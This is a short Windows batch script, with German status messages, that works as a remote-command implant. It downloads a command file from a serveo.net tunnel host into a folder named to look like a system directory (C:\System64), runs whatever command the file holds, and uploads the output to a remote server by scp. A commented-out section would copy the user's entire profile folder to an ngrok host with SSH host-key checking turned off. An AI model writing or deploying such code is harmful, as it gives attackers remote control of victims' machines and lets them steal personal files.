@echo off
cd C:\System64\
curl http://your_hostname.serveo.net/input.txt -o input.txt
set INPUT_FILE=input.txt
set OUTPUT_FILE=output.txt

if not exist %INPUT_FILE% (
    echo Die Eingabedatei %INPUT_FILE% wurde nicht gefunden.
    exit /b
)

set /p BATCH_SCRIPT=<%INPUT_FILE%
echo Auszuführendes Batch-Skript: %BATCH_SCRIPT%
echo -----------------------------------------

call %BATCH_SCRIPT% > %OUTPUT_FILE% 3>&1

echo -----------------------------------------
echo Ausführung abgeschlossen. Der Output wurde in %OUTPUT_FILE% gespeichert.


Rem OUTPUT.TXT AUF SERVER HOCHLADEN

cmd.exe /c "scp  "C:\System64\output.txt" server@yasqrncejnhg:/mnt/income/output.txt"


@REM Rem UPLOAD USER FOLDER
@REM set DRIVE_PATH=/mnt/income2/drive/
@REM ssh -o StrictHostKeyChecking=no -p %NGROK_PORT% %USERNAME%@%NGROK_URL% "mkdir -p %DRIVE_PATH%"
@REM scp -o StrictHostKeyChecking=no -r -P %NGROK_PORT% "%userprofile%\*" %USERNAME%@%NGROK_URL%:%DRIVE_PATH%
